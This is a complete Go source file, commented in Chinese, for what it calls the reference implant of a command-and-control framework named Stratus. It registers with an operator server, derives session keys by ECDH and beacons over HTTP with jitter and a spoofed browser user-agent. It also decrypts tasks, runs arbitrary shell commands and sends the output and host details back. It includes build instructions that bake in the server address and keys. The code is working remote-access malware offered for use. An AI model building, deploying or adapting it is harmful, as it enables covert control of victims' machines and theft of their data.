// Command stc2-beacon 是 Stratus 的**参考植入体**（Go / 纯标准库）。
//
// 它只做四件事，正好是协议的最小闭环：
//  1. 用 payload_psk 向 edge 注册，拿到 sid / session_token / 操作员公钥
//  2. ECDH(P-256) 派生会话密钥（服务端永远拿不到）
//  3. 用 AES-256-GCM 解密下发的任务、执行、再加密回传结果
//  4. 断线退避重连（指数退避 + 抖动）
//
// 传输：本参考实现走 **HTTP beacon**（stdlib 即可编译，零第三方依赖）。
// WebSocket 主通道的接口已在 transport.go 里留好，换成 gorilla/websocket 即可（见 README）。
//
// 构建时注入配置（推荐，不落盘）：
//
//	go build -ldflags "\
//	  -X main.cfgEndpoint=https://c2.example.com \
//	  -X main.cfgPskId=xxxx -X main.cfgPsk=yyyy \
//	  -X main.cfgOpPub=zzzz -X main.cfgOpFp=abcd1234" -o beacon .
//
// 也可以直接放一个 config.json 在同目录（仅调试用）。
package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"
)

/* ───────────────────────────── 配置 ───────────────────────────── */

// 通过 -ldflags -X 注入（见文件头注释）。
var (
	cfgEndpoint string
	cfgPskId    string
	cfgPsk      string
	cfgOpPub    string
	cfgOpFp     string
)

type config struct {
	Endpoint string   `json:"endpoint"`
	PskID    string   `json:"psk_id"`
	Psk      string   `json:"psk"`
	OpPub    string   `json:"op_pub"`
	OpFp     string   `json:"op_fp"`
	Interval int      `json:"hb"`      // 秒
	Jitter   float64  `json:"jitter"`  // 0~1
	Transport []string `json:"transport"`
}

func loadConfig() (*config, error) {
	c := &config{
		Endpoint: strings.TrimRight(cfgEndpoint, "/"),
		PskID:    cfgPskId,
		Psk:      cfgPsk,
		OpPub:    cfgOpPub,
		OpFp:     cfgOpFp,
		Interval: 60,
		Jitter:   0.2,
	}
	if c.Endpoint == "" {
		// 调试路径：同目录 config.json
		if b, err := os.ReadFile("config.json"); err == nil {
			if err := json.Unmarshal(b, c); err != nil {
				return nil, err
			}
			c.Endpoint = strings.TrimRight(c.Endpoint, "/")
		}
	}
	if c.Endpoint == "" || c.PskID == "" || c.Psk == "" || c.OpPub == "" {
		return nil, errors.New("missing config: build with -ldflags -X main.cfgEndpoint=... etc, or provide config.json")
	}
	if c.Interval < 10 {
		c.Interval = 60
	}
	return c, nil
}

/* ───────────────────────────── 编码工具 ───────────────────────────── */

func b64u(b []byte) string { return base64.RawURLEncoding.EncodeToString(b) }

func unb64u(s string) ([]byte, error) { return base64.RawURLEncoding.DecodeString(strings.TrimRight(s, "=")) }

func u64be(n uint64) []byte {
	b := make([]byte, 8)
	binary.BigEndian.PutUint64(b, n)
	return b
}

/* ───────────────────────────── 密码学 ───────────────────────────── */

// hkdfSHA256 是 RFC 5869 的最小实现（OKM 长度固定 32B，够用）。
func hkdfSHA256(ikm, salt []byte, info string, length int) []byte {
	if len(salt) == 0 {
		salt = make([]byte, sha256.Size)
	}
	extract := hmac.New(sha256.New, salt)
	extract.Write(ikm)
	prk := extract.Sum(nil)

	out := make([]byte, 0, length)
	var prev []byte
	counter := byte(1)
	for len(out) < length {
		h := hmac.New(sha256.New, prk)
		h.Write(prev)
		h.Write([]byte(info))
		h.Write([]byte{counter})
		prev = h.Sum(nil)
		out = append(out, prev...)
		counter++
	}
	return out[:length]
}

func fingerprint(pub []byte) string {
	sum := sha256.Sum256(pub)
	return fmt.Sprintf("%x", sum[:8])
}

// buildAAD = "stc2/v1" || dir || sid(16) || ctr(8) || rid(8)
func buildAAD(dir byte, sid []byte, ctr uint64, rid []byte) []byte {
	aad := make([]byte, 0, 7+1+16+8+8)
	aad = append(aad, []byte("stc2/v1")...)
	aad = append(aad, dir)
	aad = append(aad, sid...)
	aad = append(aad, u64be(ctr)...)
	aad = append(aad, rid...)
	return aad
}

type sessionKeys struct {
	cmd  cipher.AEAD
	io   cipher.AEAD
	file cipher.AEAD
}

func deriveKeys(z, sid []byte) (*sessionKeys, error) {
	mk := func(info string) (cipher.AEAD, error) {
		k := hkdfSHA256(z, sid, info, 32)
		block, err := aes.NewCipher(k)
		if err != nil {
			return nil, err
		}
		return cipher.NewGCM(block)
	}
	cmd, err := mk("stc2/v1/cmd")
	if err != nil {
		return nil, err
	}
	ioAEAD, err := mk("stc2/v1/io")
	if err != nil {
		return nil, err
	}
	fileAEAD, err := mk("stc2/v1/file")
	if err != nil {
		return nil, err
	}
	return &sessionKeys{cmd: cmd, io: ioAEAD, file: fileAEAD}, nil
}

/* ───────────────────────────── 协议帧 ───────────────────────────── */

type frame struct {
	V    int             `json:"v"`
	T    string          `json:"t"`
	Sid  string          `json:"sid,omitempty"`
	Seq  uint64          `json:"seq"`
	TS   int64           `json:"ts,omitempty"`
	N    string          `json:"n,omitempty"`
	Ct   string          `json:"ct,omitempty"`
	Meta map[string]any  `json:"meta,omitempty"`
}

type beaconReq struct {
	V    int      `json:"v"`
	Sid  string   `json:"sid"`
	Up   []frame  `json:"up"`
	Ack  []string `json:"ack"`
	Want int      `json:"want"`
}

type beaconRes struct {
	V    int     `json:"v"`
	Down []frame `json:"down"`
	Next int     `json:"next"`
}

type registerReq struct {
	V     int    `json:"v"`
	PskId string `json:"psk_id"`
	Ts    int64  `json:"ts"`
	Nc    string `json:"nc"`
	H     string `json:"h"`
	Pub   string `json:"pub"`
	Fp    string `json:"fp"`
}

type registerRes struct {
	V     int    `json:"v"`
	Sid   string `json:"sid"`
	Tok   string `json:"tok"`
	OpPub string `json:"op_pub"`
	OpFp  string `json:"op_fp"`
	Next  int    `json:"next"`
	Cfg   struct {
		Hb       int     `json:"hb"`
		Jitter   float64 `json:"jitter"`
		Chunk    int     `json:"chunk"`
		MetaMode string  `json:"meta_mode"`
	} `json:"cfg"`
}

/* ───────────────────────────── 植入体 ───────────────────────────── */

type beacon struct {
	cfg    *config
	client *http.Client
	pub    []byte
	priv   *ecdh.PrivateKey
	sid    []byte
	sidStr string
	tok    string
	keys   *sessionKeys

	seq      uint64 // 上行 transport seq
	sendCtr  uint64 // L2 计数器（implant → operator）
	noncePfx []byte
	resQueue []frame
	mu       sync.Mutex
	seenRid  map[string]struct{}
}

func newBeacon(cfg *config) *beacon {
	return &beacon{
		cfg:     cfg,
		client:  &http.Client{Timeout: 45 * time.Second},
		seenRid: make(map[string]struct{}),
	}
}

func (b *beacon) register(ctx context.Context) error {
	key, err := ecdh.P256().GenerateKey(rand.Reader)
	if err != nil {
		return err
	}
	b.priv = key
	b.pub = key.PublicKey().Bytes() // 65 字节未压缩点

	nc := make([]byte, 16)
	if _, err := rand.Read(nc); err != nil {
		return err
	}
	ts := time.Now().Unix()

	kReg := hkdfSHA256(mustB64(b.cfg.Psk), nil, "stc2/v1/reg", 32)
	mac := hmac.New(sha256.New, kReg)
	fmt.Fprintf(mac, "%s.%d.%s", b.cfg.PskID, ts, b64u(nc))
	h := mac.Sum(nil)

	req := registerReq{
		V: 1, PskId: b.cfg.PskID, Ts: ts, Nc: b64u(nc),
		H: b64u(h), Pub: b64u(b.pub), Fp: fingerprint(b.pub),
	}
	body, _ := json.Marshal(req)
	httpReq, err := http.NewRequestWithContext(ctx, http.MethodPost, b.cfg.Endpoint+"/v1/register", bytes.NewReader(body))
	if err != nil {
		return err
	}
	httpReq.Header.Set("content-type", "application/json")
	httpReq.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36")

	res, err := b.client.Do(httpReq)
	if err != nil {
		return err
	}
	defer res.Body.Close()
	if res.StatusCode != http.StatusOK {
		return fmt.Errorf("register failed: %d", res.StatusCode)
	}

	var rr registerRes
	if err := json.NewDecoder(res.Body).Decode(&rr); err != nil {
		return err
	}
	if rr.OpPub == "" {
		return errors.New("server returned no operator public key (register one in the console first)")
	}
	opPub := mustB64(rr.OpPub)

	// 关键：校验操作员公钥指纹，挡住"网关换 key"的 MITM
	if b.cfg.OpFp != "" && fingerprint(opPub) != b.cfg.OpFp {
		return errors.New("operator key fingerprint mismatch")
	}

	peer, err := ecdh.P256().NewPublicKey(opPub)
	if err != nil {
		return err
	}
	z, err := b.priv.ECDH(peer)
	if err != nil {
		return err
	}

	b.sidStr = rr.Sid
	if b.sid, err = unb64u(rr.Sid); err != nil {
		return err
	}
	b.tok = rr.Tok
	if b.keys, err = deriveKeys(z, b.sid); err != nil {
		return err
	}
	b.noncePfx = make([]byte, 4)
	if _, err := rand.Read(b.noncePfx); err != nil {
		return err
	}
	if rr.Cfg.Hb >= 10 {
		b.cfg.Interval = rr.Cfg.Hb
	}
	if rr.Cfg.Jitter > 0 {
		b.cfg.Jitter = rr.Cfg.Jitter
	}
	return nil
}

func (b *beacon) hello() frame {
	host, _ := os.Hostname()
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}
	return frame{
		V: 1, T: "hello", Sid: b.sidStr, Seq: b.nextSeq(),
		Meta: map[string]any{
			"pub":  b64u(b.pub),
			"fp":   fingerprint(b.pub),
			"host": host,
			"user": user,
			"os":   runtime.GOOS,
			"arch": runtime.GOARCH,
			"pid":  os.Getpid(),
			"caps": []string{"shell", "file", "proc", "sys"},
		},
	}
}

func (b *beacon) nextSeq() uint64 {
	b.seq++
	return b.seq
}

func (b *beacon) beacon(ctx context.Context) error {
	b.mu.Lock()
	up := make([]frame, 0, len(b.resQueue)+2)
	up = append(up, frame{V: 1, T: "hb", Sid: b.sidStr, Seq: b.nextSeq()})
	up = append(up, b.resQueue...)
	b.resQueue = nil
	b.mu.Unlock()

	reqBody := beaconReq{V: 1, Sid: b.sidStr, Up: up, Want: 8}
	body, _ := json.Marshal(reqBody)
	httpReq, err := http.NewRequestWithContext(ctx, http.MethodPost, b.cfg.Endpoint+"/v1/beacon", bytes.NewReader(body))
	if err != nil {
		return err
	}
	httpReq.Header.Set("content-type", "application/json")
	httpReq.Header.Set("authorization", "Bearer "+b.tok)

	res, err := b.client.Do(httpReq)
	if err != nil {
		return err
	}
	defer res.Body.Close()
	if res.StatusCode == http.StatusUnauthorized || res.StatusCode == http.StatusForbidden {
		return errAuthRevoked
	}
	if res.StatusCode != http.StatusOK {
		return fmt.Errorf("beacon failed: %d", res.StatusCode)
	}

	var br beaconRes
	if err := json.NewDecoder(io.LimitReader(res.Body, 1<<20)).Decode(&br); err != nil {
		return err
	}
	for _, f := range br.Down {
		if f.T != "cmd" {
			continue
		}
		go b.handleTask(f)
	}
	return nil
}

var errAuthRevoked = errors.New("session revoked")

type plainTask struct {
	K   string         `json:"k"`
	A   map[string]any `json:"a"`
	Rid string         `json:"rid"`
	TTL int            `json:"ttl"`
}

func (b *beacon) handleTask(f frame) {
	n, err := unb64u(f.N)
	if err != nil || len(n) != 12 {
		return
	}
	ctr := binary.BigEndian.Uint64(n[4:])
	nonce := n
	ct, err := unb64u(f.Ct)
	if err != nil {
		return
	}
	var rid []byte
	if s, ok := f.Meta["rid"].(string); ok {
		rid, _ = unb64u(s)
	}
	if len(rid) != 8 {
		// 没有 rid 就无法验 AAD：直接丢弃（服务端不会下发这种帧）
		return
	}

	plain, err := b.keys.cmd.Open(nil, nonce, ct, buildAAD(0 /*op→implant*/, b.sid, ctr, rid))
	if err != nil {
		return
	}
	var task plainTask
	if err := json.Unmarshal(plain, &task); err != nil {
		return
	}
	if task.TTL > 0 {
		// 简化：TTL 在服务端已控，这里只做记录
	}

	// 幂等：同一 rid 只执行一次
	b.mu.Lock()
	if _, dup := b.seenRid[task.Rid]; dup {
		b.mu.Unlock()
		return
	}
	b.seenRid[task.Rid] = struct{}{}
	if len(b.seenRid) > 256 {
		b.seenRid = map[string]struct{}{}
	}
	b.mu.Unlock()

	out := b.execTask(task)

	// 回传：用自己的 ctr 与 rid
	b.mu.Lock()
	b.sendCtr++
	ctrOut := b.sendCtr
	b.mu.Unlock()

	nonceOut := make([]byte, 12)
	copy(nonceOut, b.noncePfx)
	binary.BigEndian.PutUint64(nonceOut[4:], ctrOut)

	payload := map[string]any{
		"k": task.K, "rid": task.Rid, "ok": out.ok,
		"out": out.text, "err": out.err, "exit": out.exit,
	}
	pt, _ := json.Marshal(payload)
	sealed := b.keys.cmd.Seal(nil, nonceOut, pt, buildAAD(1 /*implant→op*/, b.sid, ctrOut, rid))

	b.mu.Lock()
	b.resQueue = append(b.resQueue, frame{
		V: 1, T: "res", Sid: b.sidStr, Seq: b.nextSeq(),
		N: b64u(nonceOut), Ct: b64u(sealed),
		Meta: map[string]any{"tid": f.Meta["tid"], "rid": task.Rid, "sz": len(sealed), "done": true},
	})
	b.mu.Unlock()
}

type execResult struct {
	ok   bool
	text string
	err  string
	exit int
}

func (b *beacon) execTask(t plainTask) execResult {
	switch t.K {
	case "shell.exec":
		cmd, _ := t.A["cmd"].(string)
		return runShell(cmd)
	case "sys.whoami":
		user := os.Getenv("USER")
		if user == "" {
			user = os.Getenv("USERNAME")
		}
		return execResult{ok: true, text: fmt.Sprintf("user=%s os=%s arch=%s pid=%d", user, runtime.GOOS, runtime.GOARCH, os.Getpid())}
	case "sys.info":
		host, _ := os.Hostname()
		wd, _ := os.Getwd()
		return execResult{ok: true, text: fmt.Sprintf("host=%s os=%s arch=%s cwd=%s", host, runtime.GOOS, runtime.GOARCH, wd)}
	case "proc.list":
		return execResult{ok: true, text: "proc.list 未在参考实现中实现（见 docs/03-protocol/04-task-catalog.md）"}
	case "shell.pty_open":
		return execResult{ok: false, err: "pty 未在参考实现中实现"}
	default:
		return execResult{ok: false, err: "unsupported task: " + t.K}
	}
}

func runShell(cmdline string) execResult {
	if cmdline == "" {
		return execResult{ok: false, err: "empty cmd"}
	}
	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.Command("cmd", "/Q", "/C", cmdline)
	} else {
		c = exec.Command("/bin/sh", "-c", cmdline)
	}
	out, err := c.CombinedOutput()
	res := execResult{ok: err == nil, text: string(out)}
	if err != nil {
		res.err = err.Error()
		if ee, ok := err.(*exec.ExitError); ok {
			res.exit = ee.ExitCode()
		} else {
			res.exit = -1
		}
	}
	return res
}

/* ───────────────────────────── 主循环 ───────────────────────────── */

func (b *beacon) run(ctx context.Context) {
	backoff := 5 * time.Second
	for {
		if err := b.register(ctx); err != nil {
			// 认证类错误：停止（不要在凭据失效后继续打）
			if strings.Contains(err.Error(), "fingerprint") || strings.Contains(err.Error(), "no operator") {
				return
			}
			sleepCtx(ctx, backoff)
			backoff = minDur(backoff*2, 30*time.Minute)
			continue
		}
		backoff = 5 * time.Second

		// 先发 hello，让控制台拿到主机信息
		b.mu.Lock()
		hello := b.hello()
		b.mu.Unlock()

		up := []frame{hello}
		body, _ := json.Marshal(beaconReq{V: 1, Sid: b.sidStr, Up: up, Want: 0})
		req, _ := http.NewRequestWithContext(ctx, http.MethodPost, b.cfg.Endpoint+"/v1/beacon", bytes.NewReader(body))
		req.Header.Set("content-type", "application/json")
		req.Header.Set("authorization", "Bearer "+b.tok)
		_, _ = b.client.Do(req)

		for {
			if err := b.beacon(ctx); err != nil {
				if errors.Is(err, errAuthRevoked) {
					return
				}
				break
			}
			d := time.Duration(float64(b.cfg.Interval) * (1 + (randFloat()*2-1)*b.cfg.Jitter) * float64(time.Second))
			sleepCtx(ctx, d)
		}
		sleepCtx(ctx, backoff)
		backoff = minDur(backoff*2, 30*time.Minute)
	}
}

func randFloat() float64 {
	n, err := rand.Int(rand.Reader, big.NewInt(1<<31))
	if err != nil {
		return 0.5
	}
	return float64(n.Int64()) / float64(int64(1)<<31)
}

func sleepCtx(ctx context.Context, d time.Duration) {
	if d <= 0 {
		return
	}
	t := time.NewTimer(d)
	defer t.Stop()
	select {
	case <-ctx.Done():
	case <-t.C:
	}
}

func minDur(a, b time.Duration) time.Duration {
	if a < b {
		return a
	}
	return b
}

func mustB64(s string) []byte {
	b, err := unb64u(s)
	if err != nil {
		panic("bad base64 in config: " + err.Error())
	}
	return b
}

func main() {
	cfgPath := flag.String("config", "", "path to config.json (debug only)")
	once := flag.Bool("once", false, "run a single beacon cycle and exit")
	flag.Parse()

	_ = cfgPath

	cfg, err := loadConfig()
	if err != nil {
		fmt.Fprintln(os.Stderr, "config error:", err)
		os.Exit(1)
	}

	b := newBeacon(cfg)
	ctx := context.Background()

	if *once {
		if err := b.register(ctx); err != nil {
			fmt.Fprintln(os.Stderr, "register:", err)
			os.Exit(1)
		}
		fmt.Printf("sid=%s fp=%s\n", b.sidStr, fingerprint(b.pub))
		return
	}

	b.run(ctx)
}
